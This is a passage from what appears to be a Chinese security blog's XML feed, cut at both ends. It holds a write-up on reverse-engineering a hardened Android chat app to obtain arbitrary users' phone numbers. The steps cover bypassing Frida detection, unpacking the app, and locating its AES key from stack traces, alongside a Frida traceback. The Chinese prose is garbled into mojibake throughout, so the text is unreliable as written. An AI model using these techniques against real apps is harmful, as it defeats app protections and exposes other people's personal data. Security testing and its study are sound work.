”ç©¶ã€‚æŸ¥æ‰¾æ›´æ·±å…¥çš„è„±å£³ç‚¹è¿™éœ€è¦èŠ±è´¹å¤§é‡æ—¶é—´å’Œç²¾åŠ›å»ç ”ç©¶ã€‚ä¸æ˜¯ä¸€è¹´è€Œå°±çš„æˆ‘ç°åœ¨åªèƒ½ç…§çŒ«ç”»è™è¿˜å®Œå…¨ä¸æ˜¯å¾ˆç†è§£å„ä¸ªè„±å£³ç‚¹çš„ã€‚å½“ç„¶æˆ‘ä»¬æ¸—é€æµ‹è¯•äººå‘˜å¯¹äºè¿™ç§ä¼šç‚¹åŸç†ä¼šä½¿ç”¨å·¥å…·å°±è¡Œäº†ã€‚æˆ‘ä»¬ä¸æ˜¯ä¸“ä¸šçš„å®‰å“é€†å‘å·¥ç¨‹å¸ˆã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> autoDecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰å“è‡ªåŠ¨åŒ–åŠ è§£å¯†æ¸—é€æµ‹è¯•å·¥å…·autoDecoder-å®æˆ˜æ¼”ç¤ºæŸèŠèŠå¤©appè·å–ä»»æ„ç”¨æˆ·æ‰‹æœºå·</title>
      <link href="/androidreverse/2023/03/articles/85d078fd29af3d21/"/>
      <url>/androidreverse/2023/03/articles/85d078fd29af3d21/</url>
      
        <content type="html"><![CDATA[<h2 id="autoDecoder"><a href="#autoDecoder" class="headerlink" title="autoDecoder"></a>autoDecoder</h2><ul><li>Burpæ’ä»¶ï¼Œæ ¹æ®è‡ªå®šä¹‰æ¥è¾¾åˆ°å¯¹æ•°æ®åŒ…çš„å¤„ç†ï¼ˆé€‚ç”¨äºåŠ è§£å¯†ã€çˆ†ç ´ç­‰ï¼‰ï¼Œç±»ä¼¼mitmproxyï¼Œä¸åŒç‚¹åœ¨äºç»è¿‡äº†burpä¸­è½¬ï¼Œåœ¨è‡ªåŠ¨åŠ è§£å¯†çš„åŸºç¡€ä¸Šï¼Œä¸å½±å“APPã€ç½‘ç«™åŠ è§£å¯†æ­£å¸¸é€»è¾‘ç­‰ã€‚<br/>å®˜æ–¹åœ°å€:https://github.com/f0ng/autoDecoder<br/><p>ä¸ªäººç†è§£:åœ¨å®‰å“appè¯·æ±‚æ•´ä½“è¢«åŠ å¯†äº†ä»¥åç”¨è¿™ä¸ªå¾ˆæ–¹ä¾¿ä¸‹é¢ä¾‹å­è¯´æ˜</p></li></ul><h2 id="å¯¹æµ‹è¯•appè¿›è¡Œåˆ†æ"><a href="#å¯¹æµ‹è¯•appè¿›è¡Œåˆ†æ" class="headerlink" title="å¯¹æµ‹è¯•appè¿›è¡Œåˆ†æ"></a>å¯¹æµ‹è¯•appè¿›è¡Œåˆ†æ</h2><ul><li>ä½¿ç”¨jadxè¿›è¡Œåç¼–çœ‹çœ‹è¿™ä¸ªapk</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161014176.png" alt="jadxæŸ¥çœ‹"><br>ä»ä¸Šé¢çœ‹ä¸å‡ºè¿™ä¸ªappæ˜¯ä»€ä¹ˆåŠ å›ºä¸€çœ‹æ˜¯MyApplication è‚¯å®šæ˜¯åŠ å›ºè¿‡çš„</p><li>ä½¿ç”¨æŸ¥çœ‹å·¥å…·çœ‹çœ‹</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161020007.png" alt="å‘ç°ä½¿ç”¨ç½‘æ˜“æ˜“ç›¾è¿›è¡ŒåŠ åŠ å›º"></p><li>å®‰è£…appåˆ°æ‰‹æœºå¹¶ä¸”è¿›è¡ŒæŠ“åŒ…</li>   æ‰¾ä¸ªå¯ç”¨çš„æ‰‹æœºå·éªŒè¯ç æ³¨å†Œç„¶åè®¾ç½®å¯†ç ç”¨è´¦å·å¯†ç ç™»é™†è¿™ä¸ªappã€‚æˆ‘å·²ç»æ³¨å†Œå¹¶ä¸”è®¾ç½®æŠŠå¯†ç è®¾ç½®å¥½äº†ã€‚ä½ ä»¬è‡ªè¡Œè®¾ç½®ã€‚ç”±äºè¿™ä¸ªappå¤„äºè¿è¡ŒçŠ¶æ€æ¶‰åŠåˆ°æ•æ„Ÿçš„åœ°æ–¹ç›´æ¥æ‰“ç å¦‚æœåç»­ä½ ä»¬é‡åˆ°çš„è¯å¯ä»¥å°è¯•ä¸€ä¸‹ã€‚è¿™æ¬¡æµ‹è¯•åœ¨äºæŒæ¡autodecoderæ’ä»¶çš„ä½¿ç”¨å…¶ä»–ä¸œè¥¿æˆ‘ç›´æ¥ç•¥è¿‡å°†è®²è§£ä¸€ä¸‹ã€‚æƒ³è¦äº†è§£è¯¦ç»†çš„æ­¥éª¤è¿‡ç¨‹åç»­ä¼šåœ¨é£æœºå†…éƒ¨ç¾¤é‡Œé¢è®²è§£å¦‚æœæœ‰äººå¯¹åšå®¢å‘å¸ƒæ–‡ç« æƒ³è¦è¯¦ç»†æ­¥éª¤ä»€ä¹ˆçš„ã€‚åºŸè¯ä¸å¤šè¯´å¼€å§‹æŠ“åŒ…äº†ã€‚   <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161037237.png" alt="æŠ“åŒ…è¯¦æƒ…"><br>é€šè¿‡æŠ“åŒ…å¯ä»¥çœ‹åˆ°æ•°æ®åŠ å¯†ä¼ è¾“ã€‚ä¸€å¼€å§‹æƒ³ç”¨fridaè‡ªåç®—æ³•æä¸€æ³¢è¯´å¹²å°±å¹²ã€‚å¯åŠ¨frida serverã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161041203.png" alt="é™„åŠ fridaç›´æ¥å¥”æºƒ"></p><pre class="language-python" data-language="python"><code class="language-python">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"D:\python3\lib\threading.py"</span><span class="token punctuation">,</span> line <span class="token number">932</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _bootstrap_inner    self<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\threading.py"</span><span class="token punctuation">,</span> line <span class="token number">870</span><span class="token punctuation">,</span> <span class="token keyword">in</span> run    self<span class="token punctuation">.</span>_target<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>_args<span class="token punctuation">,</span> <span class="token operator">**</span>self<span class="token punctuation">.</span>_kwargs<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\application.py"</span><span class="token punctuation">,</span> line <span class="token number">796</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _run    work<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\application.py"</span><span class="token punctuation">,</span> line <span class="token number">394</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _try_start    self<span class="token punctuation">.</span>_start<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">139</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _start    self<span class="token punctuation">.</span>_set_autoperform<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_autoperform_option<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">472</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _set_autoperform    <span class="token keyword">if</span> self<span class="token punctuation">.</span>_is_java_available<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">479</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _is_java_available    script <span class="token operator">=</span> self<span class="token punctuation">.</span>_session<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"java_check"</span><span class="token punctuation">,</span> source<span class="token operator">=</span><span class="token string">"rpc.exports.javaAvailable = () => Java.available;"</span><span class="token punctuation">,</span> runtime<span class="token operator">=</span>self<span class="token punctuation">.</span>_runtime<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida\core.py"</span><span class="token punctuation">,</span> line <span class="token number">26</span><span class="token punctuation">,</span> <span class="token keyword">in</span> wrapper    <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida\core.py"</span><span class="token punctuation">,</span> line <span class="token number">262</span><span class="token punctuation">,</span> <span class="token keyword">in</span> create_script    <span class="token keyword">return</span> Script<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_impl<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">)</span>frida<span class="token punctuation">.</span>TransportError<span class="token punctuation">:</span> the connection <span class="token keyword">is</span> closed</code></pre><p>æˆ‘ä»¬çœ‹sapwnçš„æ–¹å¼ ä½¿ç”¨å‘½ä»¤frida-ps -Ua  æŸ¥çœ‹åŒ…åç”»çº¢çº¿æ¡†çš„è¿™ä¸ªå°±æ˜¯<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161044636.png" alt="ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹ç›®æ ‡appçš„åŒ…å"><br>æ¥ä¸‹æ¥ä½¿ç”¨åŒ…åå¯åŠ¨firda ç›´æ¥ç­‰ä¸€ä¼šè¿›ç¨‹å°±é€€å‡ºäº†ã€‚çŒœæµ‹æ­¤è‚¯å®šæ£€æµ‹äº†fridaã€‚å¹¶ä¸”å¯èƒ½åœ¨soå±‚æ£€æµ‹ã€‚æ‰€ä»¥æˆ‘ä»¬å°±è¦å¹²æ‰fridaæ£€æµ‹ä½¿ç”¨è‘«èŠ¦å¨ƒå¤§ä½¬ä¿®æ”¹ç‰ˆçš„fridaã€‚å‡å°‘äº†fridaç‰¹å¾ä½†æ˜¯è¿˜æ˜¯ä¼šè¢«æ£€æµ‹ã€‚æ€è€ƒæ£€æµ‹è‚¯å®šåœ¨æŸä¸ªsoæ–‡ä»¶é‡Œé¢çš„æŸäº›ä¸ªå‡½æ•°è¿›è¡Œæ£€æµ‹ã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡è¿™ä¸ªæ€è·¯å¯ä»¥bypass å¯¹fridaçš„æ£€æµ‹å¹²æ‰æ£€æµ‹å‡½æ•°å³å¯ã€‚çŒœæµ‹æ£€æµ‹å¯èƒ½æ˜¯ç½‘æ˜“æ˜“ç›¾å¯¹fridaçš„æ£€æµ‹ã€‚æœ¬èº«appä»£ç æ£€æµ‹çš„æ¦‚ç‡å¾ˆå°‘ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161046159.png" alt="spawn"></p></ul><h2 id="ç¼–å†™frida-bypassè„šæœ¬å¯¹æŠ—fridaæ£€æµ‹"><a href="#ç¼–å†™frida-bypassè„šæœ¬å¯¹æŠ—fridaæ£€æµ‹" class="headerlink" title="ç¼–å†™frida bypassè„šæœ¬å¯¹æŠ—fridaæ£€æµ‹"></a>ç¼–å†™frida bypassè„šæœ¬å¯¹æŠ—fridaæ£€æµ‹</h2><ul><li>ç”±äºç½‘ç»œæŸäº›åœ°æ–¹éƒ½æ²¡æœ‰å…¬å¼€æ”¾å‡ºæ¥æ£€æµ‹ä»£ç è¿™é‡Œä»…ä»…æ¼”ç¤ºbypassæ•ˆæœ</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161055081.png" alt="bypassç½‘æ˜“æ˜“ç›¾çš„fridaæ£€æµ‹"></p></ul><h2 id="ä½¿ç”¨è‡ªåç®—æ³•è„šæœ¬å®šä½ç®—æ³•ç»†èŠ‚"><a href="#ä½¿ç”¨è‡ªåç®—æ³•è„šæœ¬å®šä½ç®—æ³•ç»†èŠ‚" class="headerlink" title="ä½¿ç”¨è‡ªåç®—æ³•è„šæœ¬å®šä½ç®—æ³•ç»†èŠ‚"></a>ä½¿ç”¨è‡ªåç®—æ³•è„šæœ¬å®šä½ç®—æ³•ç»†èŠ‚</h2><ul><li>éšä¾¿è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„æ‰‹æœºå·æ˜¾ç¤ºè´¦å·ä¸å­˜åœ¨æˆ‘ä»¬é…åˆåŒ…å°±è¡ŒæŸ¥æ‰¾<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161101292.png" alt="é€šæ€ç®—æ³•è„šæœ¬"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161104707.png" alt="å¯ä»¥çœ‹åˆ°å®šä½åˆ°äº†åŠ å¯†å‰çš„æˆ‘ä»¬æäº¤çš„æ•°æ®å¯†æ–‡æ˜æ–‡ä¸Šé¢æœ‰æˆ‘æ²¡æœ‰æˆªå›¾"><br>æ”¾å‡ºå †æ ˆä¿¡æ¯</p><pre class="language-java" data-language="java"><div class="caption"><span>å †æ ˆä¿¡æ¯</span></div><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>at <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>at com<span class="token punctuation">.</span>xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>ç›´æ¥å®šä½ç®—æ³•aes ç®—æ³• AES&#x2F;ECB&#x2F;PKCS5Padding ç§˜é’¥å’Œkeyéƒ½åå‡ºæ¥äº†è§£å¯†ä¸€æ³¢çœ‹çœ‹æˆ‘ä»¬<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161110956.png" alt="æˆåŠŸè§£å¯†è¯æ˜ä¸Šè¿°å †æ ˆç¡®å®æ˜¯è¿™ä¸ªçš„"></p><p>å› ä¸ºappæ˜¯æœ‰åŠ å›ºçš„æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨è„±å£³å·¥å…·è¿›è¡Œè„±å£³è¿™é‡Œä½¿ç”¨frida-dexdump æµ‹è¯•äº†ä¸€ä¸‹blackdexè²Œä¼¼è„±ä¸å…¨ã€‚æ€»ä¹‹ä¸¤ä¸ªå·¥å…·äº¤æ›¿ä½¿ç”¨å§<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161114762.png" alt="å®šä½key"><br>å‘ç°è€…str2æ˜¯ä¸ªå­—ç¬¦ä¸²é‚£ä¹ˆæˆ‘ä»¬æŸ¥è°ƒç”¨è¿™ä¸ªåŠ å¯†çš„<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161118967.png" alt="æŸ¥æ‰¾å¼•ç”¨"><br>çœ‹çœ‹n0.bå¯èƒ½å°±æ˜¯ç§˜é’¥ç‚¹ä¸€ä¸‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161119537.png" alt="æŸ¥æ‰¾å¼•ç”¨"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161121377.png" alt="å®šä½åˆ°ç¡®å®æ˜¯ç”¨çš„è¿™ä¸ªkey"><br>æ¥ä¸‹æ¥è¿™ä¸ªå¼•ç”¨æ‰€æœ‰çš„ç”¨frida hookä¸€éçœ‹ç™»é™†è°ƒç”¨äº†å“ªäº›å‡½æ•°ã€‚ç¡®å®šä»¥åä¸€çº§ä¸€çº§çš„åˆ¤æ–­ã€‚è¿™é‡Œæˆ‘å°±ä¸ç”¨è¿™ä¸ªhooké€šæ€ç®—æ³•å®šä½äº†æ¥ä¸€ä¸ªæ–°çš„æ—¢ç„¶æ˜¯ è¯·æ±‚å’Œå“åº”éƒ½æ˜¯base64é‚£ä¹ˆä»–è‚¯å®šè¦æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆå­—èŠ‚æ‰€ä»¥ã€‚æˆ‘ä»¬å¯ä»¥hookè½¬æ¢æˆå­—èŠ‚çš„æ–¹æ³•</p></li></ul><h2 id="å­—èŠ‚å®šä½åˆ†æappè¯·æ±‚æ¡†æ¶"><a href="#å­—èŠ‚å®šä½åˆ†æappè¯·æ±‚æ¡†æ¶" class="headerlink" title="å­—èŠ‚å®šä½åˆ†æappè¯·æ±‚æ¡†æ¶"></a>å­—èŠ‚å®šä½åˆ†æappè¯·æ±‚æ¡†æ¶</h2><ul><li>å®šä½æ•ˆæœä¸é”™<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161128010.png"></p></li><li><pre class="language-java" data-language="java"><div class="caption"><span>å †æ ˆä¿¡æ¯</span></div><code class="language-java">  <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>util<span class="token punctuation">.</span>j<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSTransactionStateUtil</span><span class="token punctuation">.</span><span class="token function">setCrossProcessHeader</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">7</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSHttpsURLConnectionExtension</span><span class="token punctuation">.</span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSInstrumentation</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token 